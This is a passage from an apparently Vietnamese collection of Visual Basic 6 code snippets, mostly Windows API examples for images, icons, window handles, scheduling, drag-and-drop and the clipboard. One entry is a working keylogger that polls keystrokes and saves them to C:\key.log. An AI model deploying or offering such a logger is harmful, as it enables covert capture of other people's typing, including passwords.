            m_Width = Mult(bBuf(19), bBuf(18))
           
            ' get the height
            m_Height = Mult(bBuf(23), bBuf(22))
        End If
       
    End If
   
    If bBuf(0) = 71 And bBuf(1) = 73 And bBuf(2) = 70 Then
    ' this is a GIF file
       
        m_ImageType = itGIF
       
        ' get the width
        m_Width = Mult(bBuf(6), bBuf(7))
       
        ' get the height
        m_Height = Mult(bBuf(8), bBuf(9))
       
        ' get bit depth
        m_Depth = (bBuf(10) And 7) + 1
    End If
   
    If bBuf(0) = 66 And bBuf(1) = 77 Then
    ' this is a BMP file
   
        m_ImageType = itBMP
       
        ' get the width
        m_Width = Mult(bBuf(18), bBuf(19))
       
        ' get the height
        m_Height = Mult(bBuf(22), bBuf(23))
       
        ' get bit depth
        m_Depth = bBuf(28)
    End If
 
    If m_ImageType = itUNKNOWN Then
    ' if the file is not one of the above type then
    ' check to see if it is a JPEG file
        Dim lPos As Long
       
        Do
        ' loop through looking for the byte sequence FF,D8,FF
        ' which marks the begining of a JPEG file
        ' lPos will be left at the postion of the start
            If (bBuf(lPos) = &amp;HFF And bBuf(lPos + 1) = &amp;HD8 _
                 And bBuf(lPos + 2) = &amp;HFF) _
                 Or (lPos &gt;= BUFFERSIZE - 10) Then Exit Do
           
            ' move our pointer up
            lPos = lPos + 1
           
        ' and continue
        Loop
       
        lPos = lPos + 2
        If lPos &gt;= BUFFERSIZE - 10 Then Exit Sub
       
       
        Do
' loop through the markers until we find the one
'starting with FF,C0 which is the block containing the
'image information
       
            Do
            ' loop until we find the beginning of the next marker
                If bBuf(lPos) = &amp;HFF And bBuf(lPos + 1) _
               &lt;&gt; &amp;HFF Then Exit Do
                lPos = lPos + 1
                If lPos &gt;= BUFFERSIZE - 10 Then Exit Sub
            Loop
           
            ' move pointer up
            lPos = lPos + 1
           
            Select Case bBuf(lPos)
                Case &amp;HC0 To &amp;HC3, &amp;HC5 To &amp;HC7, &amp;HC9 To &amp;HCB, _
                &amp;HCD To &amp;HCF
                ' we found the right block
                    Exit Do
            End Select
           
            ' otherwise keep looking
            lPos = lPos + Mult(bBuf(lPos + 2), bBuf(lPos + 1))
           
            ' check for end of buffer
            If lPos &gt;= BUFFERSIZE - 10 Then Exit Sub
           
        Loop
       
        ' If we've gotten this far it is a JPEG and we are ready
        ' to grab the information.
       
        m_ImageType = itJPEG
       
        ' get the height
        m_Height = Mult(bBuf(lPos + 5), bBuf(lPos + 4))
       
        ' get the width
        m_Width = Mult(bBuf(lPos + 7), bBuf(lPos + 6))
       
        ' get the color depth
        m_Depth = bBuf(lPos + 8) * 8
       
    End If
   
End Sub
 
Private Function Mult(lsb As Byte, msb As Byte) As Long
    Mult = lsb + (msb * CLng(256))
End Function
 
Sử dụng:

     Dim cInfo As New CImageInfo
 
    cInfo.ReadImageInfo "Đường dẫn hình"
    MsgBox cInfo.Width &amp; " - " &amp; cInfo.Height
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090016090044</MaVD>
    <NoiDung>để test bạn thêm vào 1 PictureBox (Chọn 1 hình cho Picture), 1 Command, copy code sau vào rồi F5

Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Private Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hdc As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Private Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
 
Private Const SRCAND = &amp;H8800C6
Private Const SRCCOPY = &amp;HCC0020
 
Private Sub Command1_Click()
    Dim lDC As Long
    Dim lBMP As Long
    Dim W As Integer
    Dim H As Integer
    Dim lColor As Long
    
    Screen.MousePointer = vbHourglass
    
    W = ScaleX(Picture1.Picture.Width, vbHimetric, vbPixels)
    H = ScaleY(Picture1.Picture.Height, vbHimetric, vbPixels)
    '
    ' Create Memory Compatible Bitmap to that in Picture1
    '
    lBMP = CreateCompatibleBitmap(Picture1.hdc, W, H)
    '
    ' Create Compatible DC in memory
    '
    lDC = CreateCompatibleDC(Picture1.hdc)
    '
    ' Select the Bitmap into the memory DC
    '
    Call SelectObject(lDC, lBMP)
    BitBlt lDC, 0, 0, W, H, Picture1.hdc, 0, 0, SRCCOPY
    '
    ' Quickly clear the Picture in Picture1
    '
    Picture1 = LoadPicture("")
    
    For lColor = 255 To 0 Step -3
        '
        ' Set the backcolor to a gray scale -&gt; black
        '
        Picture1.BackColor = RGB(lColor, lColor, lColor)
        '
        ' Copy the bitmap into the picturebox 'AND' with the backcolor
        '
        BitBlt Picture1.hdc, 0, 0, W, H, lDC, 0, 0, SRCAND
        '
        ' Pause for a bit
        '
        Sleep 15
    Next
    '
    ' Clear up our DC's and Bitmaps
    '
    Call DeleteDC(lDC)
    Call DeleteObject(lBMP)
    Screen.MousePointer = vbDefault
    
End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090316090302</MaVD>
    <NoiDung>Private Const IDI_APPLICATION = 32512&amp;
Private Const IDI_ASTERISK = 32516&amp;
Private Const IDI_EXCLAMATION = 32515&amp;
Private Const IDI_HAND = 32513&amp;
Private Const IDI_ERROR = IDI_HAND
Private Const IDI_INFORMATION = IDI_ASTERISK
Private Const IDI_QUESTION = 32514&amp;
Private Const IDI_WARNING = IDI_EXCLAMATION
Private Const IDI_WINLOGO = 32517
Private Declare Function DestroyIcon Lib "user32" (ByVal hIcon As Long) As Long
Private Declare Function DrawIcon Lib "user32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal hIcon As Long) As Long
Private Declare Function LoadIcon Lib "user32" Alias "LoadIconA" (ByVal hInstance As Long, ByVal lpIconName As Long) As Long
 
Private Sub Form_Paint()
Dim hIcon As Long, hDuplIcon As Long
Dim i As Integer
i = 30
' Open the "question mark" icon
hIcon = LoadIcon(ByVal 0&amp;, IDI_APPLICATION)
' Draw the result on the form
DrawIcon Me.hdc, 0, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_ASTERISK)
DrawIcon Me.hdc, i * 1, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_EXCLAMATION)
DrawIcon Me.hdc, i * 2, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_HAND)
DrawIcon Me.hdc, i * 3, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_ERROR)
DrawIcon Me.hdc, i * 4, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_INFORMATION)
DrawIcon Me.hdc, i * 5, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_QUESTION)
DrawIcon Me.hdc, i * 6, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_WARNING)
DrawIcon Me.hdc, i * 7, 10, hIcon
 
hIcon = LoadIcon(ByVal 0&amp;, IDI_WINLOGO)
DrawIcon Me.hdc, i * 8, 10, hIcon
 
' Destroy the handles
DestroyIcon hIcon
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090416090425</MaVD>
    <NoiDung>Const DI_MASK = &amp;H1
Const DI_IMAGE = &amp;H2
Const DI_NORMAL = DI_MASK Or DI_IMAGE
Private Declare Function ExtractAssociatedIcon Lib "shell32.dll" Alias "ExtractAssociatedIconA" (ByVal hInst As Long, ByVal lpIconPath As String, lpiIcon As Long) As Long
Private Declare Function DrawIconEx Lib "user32" (ByVal hdc As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal cxWidth As Long, ByVal cyWidth As Long, ByVal istepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Private Declare Function DestroyIcon Lib "user32" (ByVal hIcon As Long) As Long
 
Private Sub Form_Paint()
Dim mIcon As Long
'Extract the associated icon
mIcon = ExtractAssociatedIcon(App.hInstance, "C:\WINDOWS\system32\spider.exe", 2)
'Draw the icon on the form
DrawIconEx Me.hdc, 0, 0, mIcon, 0, 0, 0, 0, DI_NORMAL
'remove the icon from the memory
DestroyIcon mIcon
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090716090712</MaVD>
    <NoiDung>Thêm vào 1 PictureBox, dán code vào và chạy thôi.

Option Explicit
Private Type BITMAP
    bmType As Long
    bmWidth As Long
    bmHeight As Long
    bmWidthBytes As Long
    bmPlanes As Integer
    bmBitsPixel As Integer
    bmBits As Long
End Type
 
'Each line below (started by "Private" word) have to be pasted as a single line
Private Declare Function BitBlt Lib "gdi32.dll" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
 
Private Declare Function CreateCompatibleDC Lib "gdi32.dll" (ByVal hdc As Long) As Long
 
Private Declare Function DeleteDC Lib "gdi32.dll" (ByVal hdc As Long) As Long
 
Private Declare Function SelectObject Lib "gdi32.dll" (ByVal hdc As Long, ByVal hObject As Long) As Long
 
Private Declare Function DeleteObject Lib "gdi32.dll" (ByVal hObject As Long) As Long
 
Private Declare Function GetObject Lib "gdi32.dll" Alias "GetObjectA" (ByVal hObject As Long, ByVal nCount As Long, lpObject As Any) As Long
 
Private Sub Form_Load()
    'Hide Picture1 and define its properties
    Picture1.Visible = False
    Picture1.AutoRedraw = False
    Picture1.AutoSize = True
    'Define form properties to be equivalent
    Form1.AutoRedraw = False
End Sub
 
Private Sub Form_Paint()
    'Define necessary variables
    Dim Success As Long 'Result of API calls
    Dim bmp As BITMAP 'BMP copied from Picture1
    Dim srcDC As Long 'Source hDC
    Dim hSrcPrevBmp As Long 'Destination hDC
    Dim srcBmp As Long
    Dim hSrcBmp As Long
    Dim y As Long
    Dim x As Long
 
    'Loads picture - it can be any supported format of picture box control
    Picture1.Picture = LoadPicture("C:\WINDOWS\Gone Fishing.bmp") 'doi hinh khác o day
    srcBmp = Picture1.Picture
    Success = GetObject(srcBmp, Len(bmp), bmp)
    srcDC = CreateCompatibleDC(Form1.hdc)
    hSrcBmp = SelectObject(srcDC, srcBmp)
 
    'Copy source Bitmap over form many times are necessary to cover its area
    For y = 0 To Form1.ScaleHeight Step bmp.bmHeight
        For x = 0 To Form1.ScaleWidth Step bmp.bmWidth
            'The follow line have to be in a single line
            Success = BitBlt(Form1.hdc, x, y, bmp.bmWidth, bmp.bmHeight, srcDC, 0, 0, &amp;HCC0020)
        Next x
    Next y
 
    'Delete used objetcs and DC
    Success = DeleteObject(hSrcBmp)
    Success = DeleteDC(srcDC)
End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092717032754</MaVD>
    <NoiDung>'Add this code to a module:
 
Option Explicit
 
Public Type RECT 
  Left As Long
  Top As Long
  Right As Long
  Bottom As Long
End Type 
 
Public Declare Function BitBlt Lib "gdi32" _ 
  (ByVal hDCDest As Long, ByVal XDest As Long, _
   ByVal YDest As Long, ByVal nWidth As Long, _
   ByVal nHeight As Long, ByVal hDCSrc As Long, _
   ByVal XSrc As Long, ByVal YSrc As Long, _
   ByVal dwRop As Long) As Long
 
Public Declare Function CreateBitmap Lib "gdi32" _
  (ByVal nWidth As Long, _
   ByVal nHeight As Long, _
   ByVal nPlanes As Long, _
   ByVal nBitCount As Long, _
   lpBits As Any) As Long
 
Public Declare Function SetBkColor Lib "gdi32" _
   (ByVal hdc As Long, ByVal crColor As Long) As Long
 
Public Declare Function SelectObject Lib "gdi32" _
   (ByVal hdc As Long, ByVal hObject As Long) As Long
 
Public Declare Function CreateCompatibleBitmap Lib "gdi32" _
   (ByVal hdc As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
 
Public Declare Function CreateCompatibleDC Lib "gdi32" _
   (ByVal hdc As Long)As Long
 
Public Declare Function DeleteDC Lib "gdi32" _
   (ByVal hdc As Long) As Long
 
Public Declare Function DeleteObject Lib "gdi32" _
   (ByVal hObject As Long) As Long
 
Add this code to the form's General Declarations procedure:
 
Private Sub Command1_Click() 
Dim R As RECT 
With R 
.Left = 0 
.Top = 0 
.Right = Picture1.ScaleWidth 
.Bottom = Picture1.ScaleHeight 
End With 
TransparentBlt Form1.hdc, Form1.hdc, Picture1.hdc, R, 20, 20, vbWhite
End Sub
 
Private Sub TransparentBlt(OutDstDC As Long, _ 
                           DstDC As Long,_
                           SrcDC As Long,_ 
                           SrcRect As RECT, _ 
                           DstX As Integer,_ 
                           DstY As Integer,_ 
                           TransColor As Long) 
 
Dim nRet As Long, W As Integer, H As Integer 
Dim MonoMaskDC As Long, hMonoMask As Long 
Dim MonoInvDC As Long, hMonoInv As Long 
Dim ResultDstDC As Long, hResultDst As Long 
Dim ResultSrcDC As Long, hResultSrc As Long 
Dim hPrevMask As Long, hPrevInv As Long 
Dim hPrevSrc As Long, hPrevDst As Long 
W = SrcRect.Right - SrcRect.Left + 1 
H = SrcRect.Bottom - SrcRect.Top + 1 
MonoMaskDC = CreateCompatibleDC(DstDC) 
MonoInvDC = CreateCompatibleDC(DstDC) 
hMonoMask = CreateBitmap(W, H, 1, 1, ByVal 0&amp;) 
hMonoInv = CreateBitmap(W, H, 1, 1, ByVal 0&amp;) 
hPrevMask = SelectObject(MonoMaskDC, hMonoMask) 
hPrevInv = SelectObject(MonoInvDC, hMonoInv) 
ResultDstDC = CreateCompatibleDC(DstDC) 
ResultSrcDC = CreateCompatibleDC(DstDC) 
hResultDst = CreateCompatibleBitmap(DstDC, W, H) 
hResultSrc = CreateCompatibleBitmap(DstDC, W, H) 
hPrevDst = SelectObject(ResultDstDC, hResultDst) 
hPrevSrc = SelectObject(ResultSrcDC, hResultSrc) 
Dim OldBC As Long 
OldBC = SetBkColor(SrcDC, TransColor) 
nRet = BitBlt(MonoMaskDC, 0, 0, W, H, SrcDC, _ 
SrcRect.Left, SrcRect.Top, vbSrcCopy) 
TransColor = SetBkColor(SrcDC, OldBC) 
nRet = BitBlt(MonoInvDC, 0, 0, W, H, _ 
MonoMaskDC, 0, 0, vbNotSrcCopy) 
nRet = BitBlt(ResultDstDC, 0, 0, W, H, _ 
DstDC, DstX, DstY, vbSrcCopy) 
nRet = BitBlt(ResultDstDC, 0, 0, W, H, _ 
MonoMaskDC, 0, 0, vbSrcAnd) 
nRet = BitBlt(ResultSrcDC, 0, 0, W, H, SrcDC, _ 
SrcRect.Left, SrcRect.Top, vbSrcCopy)  
nRet = BitBlt(ResultSrcDC, 0, 0, W, H, _ 
MonoInvDC, 0, 0, vbSrcAnd)  
nRet = BitBlt(ResultDstDC, 0, 0, W, H, _ 
ResultSrcDC, 0, 0, vbSrcInvert) 
nRet = BitBlt(OutDstDC, DstX, DstY, W, H, _ 
ResultDstDC, 0, 0, vbSrcCopy) 
hMonoMask = SelectObject(MonoMaskDC, hPrevMask) 
DeleteObject hMonoMask 
hMonoInv = SelectObject(MonoInvDC, hPrevInv) 
DeleteObject hMonoInv 
hResultDst = SelectObject(ResultDstDC, hPrevDst) 
DeleteObject hResultDst 
hResultSrc = SelectObject(ResultSrcDC, hPrevSrc) 
DeleteObject hResultSrc 
DeleteDC MonoMaskDC 
DeleteDC MonoInvDC 
DeleteDC ResultDstDC 
DeleteDC ResultSrcDC
End Sub
 
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092917032910</MaVD>
    <NoiDung>'General Declarations:
Private Type TypeIcon
    cbSize As Long
    picType As PictureTypeConstants
    hIcon As Long
End Type
 
Private Type CLSID
    id(16) As Byte
End Type
 
Private Const MAX_PATH = 260
Private Type SHFILEINFO
    hIcon As Long ' out: icon
    iIcon As Long ' out: icon index
    dwAttributes As Long ' out: SFGAO_ flags
    szDisplayName As String * MAX_PATH ' out: display name (or path)
    szTypeName As String * 80 ' out: type name
End Type
 
Private Declare Function OleCreatePictureIndirect Lib "oleaut32.dll" (pDicDesc As TypeIcon, riid As CLSID, ByVal fown As Long, lpUnk As Object) As Long
Private Declare Function SHGetFileInfo Lib "shell32.dll" Alias "SHGetFileInfoA" (ByVal pszPath As String, ByVal dwFileAttributes As Long, psfi As SHFILEINFO, ByVal cbFileInfo As Long, ByVal uFlags As Long) As Long
 
Private Const SHGFI_ICON = &amp;H100
Private Const SHGFI_LARGEICON = &amp;H0
Private Const SHGFI_SMALLICON = &amp;H1
 
' Convert an icon handle into an IPictureDisp.
Private Function IconToPicture(hIcon As Long) As IPictureDisp
Dim cls_id As CLSID
Dim hRes As Long
Dim new_icon As TypeIcon
Dim lpUnk As IUnknown
 
    With new_icon
        .cbSize = Len(new_icon)
        .picType = vbPicTypeIcon
        .hIcon = hIcon
    End With
    With cls_id
        .id(8) = &amp;HC0
        .id(15) = &amp;H46
    End With
    hRes = OleCreatePictureIndirect(new_icon, _
        cls_id, 1, lpUnk)
    If hRes = 0 Then Set IconToPicture = lpUnk
End Function
 
'Icon function
Private Function GetIcon(FileName As String, icon_size As Long) As IPictureDisp
Dim index As Integer
Dim hIcon As Long
Dim item_num As Long
Dim icon_pic As IPictureDisp
Dim sh_info As SHFILEINFO
 
    SHGetFileInfo FileName, 0, sh_info, _
        Len(sh_info), SHGFI_ICON + icon_size
    hIcon = sh_info.hIcon
    Set icon_pic = IconToPicture(hIcon)
    Set GetIcon = icon_pic
End Function
 
'Use these functions for the program e.g. Picture1.Picture = GetBigIcon("C:\Autoexec.bat")
Public Function GetSmallIcon(FileName As String) As IPictureDisp
Set GetSmallIcon = GetIcon(FileName, SHGFI_SMALLICON)
End Function
 
Public Function GetBigIcon(FileName As String) As IPictureDisp
Set GetBigIcon = GetIcon(FileName, SHGFI_LARGEICON)
End Function
 
'Ví du.
Private Sub Command2_Click()
Picture1.Picture = GetBigIcon("E:\aNDy desiGn\VINH TAI\VT_090323.pdf")
Picture2.Picture = GetSmallIcon("E:\aNDy desiGn\VINH TAI\VT_090323.pdf")
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094517034512</MaVD>
    <NoiDung>Option Explicit
 
Public strCache As String
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwprocessid As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
(ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const WM_GETTEXTLENGTH = &amp;HE:  Const WM_GETTEXT = &amp;HD: Const GW_HWNDNEXT = 2
 
Private Sub Command1_Click()
    GetIPProcess
End Sub
 
Private Sub GetIPProcess() ' VBScript tìm Process ID
Dim objProcess, objProcesses
Set objProcesses = GetObject("winmgmts://").execquery("Select * from win32_process")
' truongphu, camlâm, khanhhoa
    For Each objProcess In objProcesses
        If UCase(objProcess.Name) = Text1.Text Then strCache = objProcess.Handle
    Next
 
If strCache = "" Then
    MsgBox "Không Tìm Thâ'y."
Else
    FindhWnd
End If
 
End Sub
 
Private Sub FindhWnd()
Dim hProcess As Long, hWndApp As Long
    hProcess = CLng(strCache)
    hWndApp = GetWinHandle(hProcess)
If hWndApp &lt;&gt; 0 Then MsgBox "hWnd là: " &amp; hWndApp &amp; " Tiêu Ðê' là: " &amp; WinGetText(hWndApp)
End Sub
 
Function ProcIDFromWnd(ByVal hwnd As Long) As Long
Dim idProc As Long
    GetWindowThreadProcessId hwnd, idProc
    ProcIDFromWnd = idProc
End Function
 
Function GetWinHandle(hProcess As Long) As Long
Dim tempHwnd As Long
tempHwnd = FindWindow(vbNullString, vbNullString)
 
    Do Until tempHwnd = 0
        If GetParent(tempHwnd) = 0 And (hProcess = ProcIDFromWnd(tempHwnd)) Then
                GetWinHandle = tempHwnd
                Exit Do
        End If
        tempHwnd = GetWindow(tempHwnd, GW_HWNDNEXT)
    Loop
End Function
 
Function WinGetText(hwnd As Long) As String
On Error Resume Next
    Dim length&amp;, result&amp;, strtmp$, S As Variant
    length&amp; = SendMessage(hwnd, WM_GETTEXTLENGTH, ByVal 0, ByVal 0) + 1
    strtmp$ = Space$(length)
    result&amp; = SendMessage(hwnd, WM_GETTEXT, ByVal length, ByVal strtmp)
    S = Split(strtmp, vbNullChar)
    WinGetText$ = S(0)
End Function
 
Private Sub Form_Load()
Text1.Text = "NOTEPAD.EXE"
Shell "Notepad"
End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094617034634</MaVD>
    <NoiDung>'Cần 1 commandButton
Private Sub Command1_Click()
    'Có thể áp dụng với các máy khác trong mạng LAN (Dịch vụ Task scheduler phải được chạy bạn mới được sử dụng lệnh AT)
        
    'Đoạn code dưới có tác dụng chạy notepad lúc 13 giờ 37 phút hằng ngày.
 
    Shell "at 13:37 /interactive /every:M,T,W,Th,F,S,Su C:\WINDOWS\notepad.exe", vbHide
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094817034834</MaVD>
    <NoiDung>Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal lBuffer As Long) As Long
Public Function GetShortPath(strFileName As String) As String
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim lngRes As Long, strPath As String
    'Create a buffer
    strPath = String$(165, 0)
    'retrieve the short pathname
    lngRes = GetShortPathName(strFileName, strPath, 164)
    'remove all unnecessary chr$(0)'s
    GetShortPath = Left$(strPath, lngRes)
End Function
Private Sub Form_Load()
    ' File hay Folder phai có
    MsgBox GetShortPath("C:\Documents and Settings\All Users\Application Data\Microsoft\HTML Help\Huong Dan1.doc")
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095017035022</MaVD>
    <NoiDung>file theo dõi ở C:\key.log, bạn có thể đổi lại

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Dim Save$, SN$, SO$, Cnt&amp;
Function GetPressedKey() As String
    For Cnt = 32 To 128
        If GetAsyncKeyState(Cnt) &lt;&gt; 0 Then
            GetPressedKey = Chr$(Cnt)
            Exit For
        End If
    Next Cnt
End Function
 
Private Sub Form_Load()
Timer1.Interval = 200
Timer2.Interval = 10000
End Sub
 
Private Sub Timer1_Timer()
 SN = GetPressedKey
    If SN &lt;&gt; SO Then
        SO = SN
        Save = Save + SO
    End If
End Sub
 
Private Sub Timer2_Timer()
Open "C:\key.log" For Output As #1
    Print #1, Save
Close #1
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095117035146</MaVD>
    <NoiDung> 
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Const VK_LSHIFT = &amp;HA0
Const VK_RSHIFT = &amp;HA1
Const VK_LCONTROL = &amp;HA2
Const VK_RCONTROL = &amp;HA3
Const VK_LMENU = &amp;HA4
Const VK_RMENU = &amp;HA5
Const KEY_MASK As Integer = &amp;HFF80 ' decimal -128
 
Private Sub Command1_KeyDown(KeyCode As Integer, Shift As Integer)
If GetKeyState(VK_LSHIFT) And KEY_MASK Then Label1.BackColor = vbRed Else Label1.BackColor = &amp;H8000000F
If GetKeyState(VK_RSHIFT) And KEY_MASK Then Label2.BackColor = vbRed Else Label2.BackColor = &amp;H8000000F
If GetKeyState(VK_LCONTROL) And KEY_MASK Then Label3.BackColor = vbRed Else Label3.BackColor = &amp;H8000000F
If GetKeyState(VK_RCONTROL) And KEY_MASK Then Label4.BackColor = vbRed Else Label4.BackColor = &amp;H8000000F
If GetKeyState(VK_LMENU) And KEY_MASK Then Label5.BackColor = vbRed Else Label5.BackColor = &amp;H8000000F
If GetKeyState(VK_RMENU) And KEY_MASK Then Label6.BackColor = vbRed Else Label6.BackColor = &amp;H8000000F
' Nhâ'n Alt phai nhâ'n thêm lâ`n nu'a
If (GetKeyState(VK_LMENU) And KEY_MASK) Or (GetKeyState(VK_RMENU) And KEY_MASK) Then Label7.ForeColor = vbRed Else Label7.ForeColor = vbBlack
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095317035311</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>095617035650</MaVD>
    <NoiDung>Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long

 Private Sub Form_Load()
Dim shelltraywnd As Long
shelltraywnd = FindWindow("shell_traywnd", vbNullString)
Call SendMessage(FindWindowEx(shelltraywnd, 0&amp;, "button", vbNullString), &amp;HC, 0&amp;, "&lt;Chuoi&gt;")
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090017040054</MaVD>
    <NoiDung>Tạo Form1 có 1 textbox, name: text1, multiLine=true, OLEDropMode = 0 (default) 
paste vào form1 

 Option Explicit 
 Private Sub Form_Load()
DragAcceptFiles Text1.hWnd, True 
Call Hook(Text1.hWnd) 
End Sub 

 Private Sub Form_Unload(Cancel As Integer)
Call UnHook
End Sub  

Paste vào Module1 

 Option Explicit
 Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Sub DragAcceptFiles Lib "shell32" (ByVal hWnd As Long, ByVal fAccept As Long)
Public Declare Function DragQueryFile Lib "shell32" Alias "DragQueryFileW" (ByVal HDROP As Long, ByVal UINT As Long, ByVal lpStr As String, ByVal ch As Long) As Long 
 Public Const GWL_WNDPROC = -4 
Public lpPrevWndProc As Long
Public Const WM_DROPFILES As Long = &amp;H233 
Private lngHWnd As Long 
 Public Sub Hook(hWnd As Long)
lngHWnd = hWnd 
lpPrevWndProc = SetWindowLong(lngHWnd, GWL_WNDPROC, AddressOf WindowProc) 
End Sub
 Public Sub UnHook() 
Dim lngReturnValue As Long 
lngReturnValue = SetWindowLong(lngHWnd, GWL_WNDPROC, lpPrevWndProc)
End Sub 

 Function WindowProc(ByVal hWnd As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Select Case uMsg 
 Case WM_DROPFILES
 Dim nFiles As Long, Files() As String, i As Long 
Dim FileName As String 
 nFiles = DragQueryFile(wParam, -1, "", 0) 
ReDim Files(0 To nFiles - 1) As String
FileName = Space(256) 

 For i = 0 To nFiles - 1 
DragQueryFile wParam, i, FileName, Len(FileName) 
Files(i) = TrimNull(StrConv(FileName, vbFromUnicode))
Next i 

 Set_Text hWnd, Join(Files, vbCrLf)
 Case Else: WindowProc = CallWindowProc(lpPrevWndProc, hWnd, uMsg, wParam, lParam) 
End Select
 End Function

 Private Function TrimNull(ByVal StrIn As String) As String 
Dim nul As Long 
' nul = InStr(StrIn, vbNullChar) 
Select Case nul
Case Is &gt; 1
TrimNull = Left(StrIn, nul - 1)
Case 1 
TrimNull = "" 
Case 0 
TrimNull = Trim(StrIn) 
End Select 
End Function  

paste vào module2 

 Option Explicit 
 Private Const CF_UNICODETEXT As Long = 13 Private Const GMEM_MOVEABLE As Long = &amp;H2 Private Const GMEM_ZEROINIT As Long = &amp;H40
 Private Declare Function OpenClipboard Lib "user32.dll" (ByVal hWnd As Long) As Long
Private Declare Function CloseClipboard Lib "user32.dll" () As Long 
Private Declare Function GetClipboardData Lib "user32.dll" (ByVal wFormat As Long) As Long 
Private Declare Function SetClipboardData Lib "user32.dll" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Private Declare Function EmptyClipboard Lib "user32.dll" () As Long
Private Declare Function IsClipboardFormatAvailable Lib "user32.dll" (ByVal wFormat As Long) As Long Private Declare Function lstrcpy Lib "kernel32.dll" Alias "lstrcpyW" (ByVal lpString1 As Long, ByVal lpString2 As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long 
Private Declare Function GlobalLock Lib "kernel32.dll" (ByVal hMem As Long) As Long 
Private Declare Function GlobalUnlock Lib "kernel32.dll" (ByVal hMem As Long) As Long
Private Declare Function GlobalSize Lib "kernel32" (ByVal hMem As Long) As Long 
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByRef lParam As Any) As Long 
Private Const WM_COPY As Long = &amp;H301
Private Const WM_PASTE As Long = &amp;H302  

Private Function Get_clipboard() As String
Dim myStrPtr As Long, myLen As Long, myLock As Long, myData As String 
 OpenClipboard 0&amp;
 If IsClipboardFormatAvailable(CF_UNICODETEXT) = 0 Then
MsgBox "Clipboard Text is not available now"
Exit Function 
 myStrPtr = GetClipboardData(CF_UNICODETEXT)
 If myStrPtr = 0 Then
